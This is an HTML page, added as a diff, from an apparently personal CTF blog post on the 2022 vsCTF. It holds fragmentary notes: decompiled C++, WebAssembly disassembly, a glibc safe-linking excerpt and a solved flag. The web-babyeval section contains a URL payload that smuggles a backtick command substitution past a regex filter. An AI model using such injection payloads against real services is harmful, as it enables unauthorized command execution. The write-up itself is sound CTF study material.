@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>2022 vsCTF | xrivendell7&#39;s ctf blog（佩奇小屋）</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="web-sanity check rev-binaryflood __int64 __fastcall sub_40147F(char *a1, char *a2) { char v3; &#x2F;&#x2F; [rsp+1Fh] [rbp-51h] BYREF char a1a[32]; &#x2F;&#x2F; [rsp+20h] [rbp-50h] BYREF char v5[40]; &#x2F;&#x2F; [rsp+40h] [rbp-30">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2022 vsCTF">
+<meta property="og:url" content="http://example.com/2022/07/17/vsctf2022/index.html">
+<meta property="og:site_name" content="xrivendell7&#39;s ctf blog（佩奇小屋）">
+<meta property="og:description" content="web-sanity check rev-binaryflood __int64 __fastcall sub_40147F(char *a1, char *a2) { char v3; &#x2F;&#x2F; [rsp+1Fh] [rbp-51h] BYREF char a1a[32]; &#x2F;&#x2F; [rsp+20h] [rbp-50h] BYREF char v5[40]; &#x2F;&#x2F; [rsp+40h] [rbp-30">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-07-17T03:07:10.000Z">
+<meta property="article:modified_time" content="2025-11-18T08:01:48.217Z">
+<meta property="article:author" content="xrivendell7">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="xrivendell7's ctf blog（佩奇小屋）" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">xrivendell7&#39;s ctf blog（佩奇小屋）</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-vsctf2022" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/07/17/vsctf2022/" class="article-date">
+  <time class="dt-published" datetime="2022-07-17T03:07:10.000Z" itemprop="datePublished">2022-07-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      2022 vsCTF
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <ul>
+<li><h3 id="web-sanity-check"><a href="#web-sanity-check" class="headerlink" title="web-sanity check"></a>web-sanity check</h3></li>
+<li><h3 id="rev-binaryflood"><a href="#rev-binaryflood" class="headerlink" title="rev-binaryflood"></a>rev-binaryflood</h3><ul>
+<li><pre><code class="language-cpp">__int64 __fastcall sub_40147F(char *a1, char *a2)
+{
+char v3; // [rsp+1Fh] [rbp-51h] BYREF
+char a1a[32]; // [rsp+20h] [rbp-50h] BYREF
+char v5[40]; // [rsp+40h] [rbp-30h] BYREF
+
+std::allocator&lt;char&gt;::allocator(&amp;v3);
+std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(a1, &amp;unk_40400A, &amp;v3);
+std::allocator&lt;char&gt;::~allocator(&amp;v3);
+if ( a2 )
+{
+  sub_40147F(a1a, *((char **)a2 + 1));
+  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator+=(a1, a1a);
+  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(a1a);
+  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator+=(a1, (unsigned int)*a2);
+  sub_40147F(v5, *((char **)a2 + 2));
+  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator+=(a1, v5);
+  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(v5);
+}
+return (__int64)a1;
+}
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* ### web-babyeval</span><br><span class="line">  *   ```bash</span><br><span class="line">      https://babyeval-twekqonvua-uc.a.run.app/?payload=directory`flag`</span><br></pre></td></tr></table></figure>
+
+  得到flag
+
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vsctf&#123;regExAin’tGoodEnufForWAF&#125;</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+</li>
+<li><h3 id="web-babywasm"><a href="#web-babywasm" class="headerlink" title="web-babywasm"></a>web-babywasm</h3><ul>
+<li><p>这段是rust写的webassembly的编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">(func $memcmp (;244;) (param $var0 i32) (param $var1 i32) (param $var2 i32) (result i32)</span><br><span class="line">  (local $var3 i32) (local $var4 i32) (local $var5 i32)</span><br><span class="line">  i32.const 0</span><br><span class="line">  local.set $var3</span><br><span class="line">  block $label0</span><br><span class="line">    local.get $var2</span><br><span class="line">    i32.eqz</span><br><span class="line">    br_if $label0</span><br><span class="line">    block $label1</span><br><span class="line">      loop $label2</span><br><span class="line">        local.get $var0</span><br><span class="line">        i32.load8_u</span><br><span class="line">        local.tee $var4</span><br><span class="line">        local.get $var1</span><br><span class="line">        i32.load8_u</span><br><span class="line">        local.tee $var5</span><br><span class="line">        i32.ne</span><br><span class="line">        br_if $label1</span><br><span class="line">        local.get $var0</span><br><span class="line">        i32.const 1</span><br><span class="line">        i32.add</span><br><span class="line">        local.set $var0</span><br><span class="line">        local.get $var1</span><br><span class="line">        i32.const 1</span><br><span class="line">        i32.add</span><br><span class="line">        local.set $var1</span><br><span class="line">        local.get $var2</span><br><span class="line">        i32.const -1</span><br><span class="line">        i32.add</span><br><span class="line">        local.tee $var2</span><br><span class="line">        i32.eqz</span><br><span class="line">        br_if $label0</span><br><span class="line">        br $label2</span><br><span class="line">      end $label2</span><br><span class="line">    end $label1</span><br><span class="line">    local.get $var4</span><br><span class="line">    local.get $var5</span><br><span class="line">    i32.sub</span><br><span class="line">    local.set $var3</span><br><span class="line">  end $label0</span><br><span class="line">  local.get $var3</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">  (func $func373 (param $var0 i32) (param $var1 i32) (param $var2 i32) (param $var3 i32) (result i32)</span><br><span class="line">  (local $var4 i32)</span><br><span class="line">  i32.const 0</span><br><span class="line">  local.set $var4</span><br><span class="line">  block $label0</span><br><span class="line">    local.get $var1</span><br><span class="line">    local.get $var3</span><br><span class="line">    i32.ne</span><br><span class="line">    br_if $label0</span><br><span class="line">    local.get $var0</span><br><span class="line">    local.get $var2</span><br><span class="line">    local.get $var1</span><br><span class="line">    call $memcmp</span><br><span class="line">    i32.eqz</span><br><span class="line">    local.set $var4</span><br><span class="line">  end $label0</span><br><span class="line">  local.get $var4</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><h3 id="pwn-ezorange"><a href="#pwn-ezorange" class="headerlink" title="pwn-ezorange"></a>pwn-ezorange</h3><ul>
+<li><pre><code class="language-cpp">/* Safe-Linking:
+   Use randomness from ASLR (mmap_base) to protect single-linked lists
+   of Fast-Bins and TCache.  That is, mask the &quot;next&quot; pointers of the
+   lists&#39; chunks, and also perform allocation alignment checks on them.
+   This mechanism reduces the risk of pointer hijacking, as was done with
+   Safe-Unlinking in the double-linked lists of Small-Bins.
+   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with
+   larger pages provide less entropy, although the pointer mangling
+   still works.  */
+#define PROTECT_PTR(pos, ptr) \
+  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))
+#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)
+</code></pre>
+</li>
+<li>并且<code>sysmalloc</code>直接通过<code>_int_free</code>释放掉了，所以<code>__free_hook</code>没用</li>
+<li></li>
+</ul>
+</li>
+<li><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/07/17/vsctf2022/" data-id="cuidpIYpu52vj4i0ijikTL2iQ" data-title="2022 vsCTF" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/08/26/wmctf2022/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          2022 WMCTF
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/04/09/2022picoctfctf/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">picoctf2022</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/11/">November 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/09/">September 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/08/">August 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/11/18/n1ctfjunior-re/">n1ctfjunior-re</a>
+          </li>
+        
+          <li>
+            <a href="/2025/11/01/qwb2025-re/">qwb2025-re</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/25/qwb2025-pwn/">qwb2025-pwn flagmarket</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/18/train0927/">train0927</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/10/junior/">n1ctf junior 2/2 web</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 xrivendell7<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
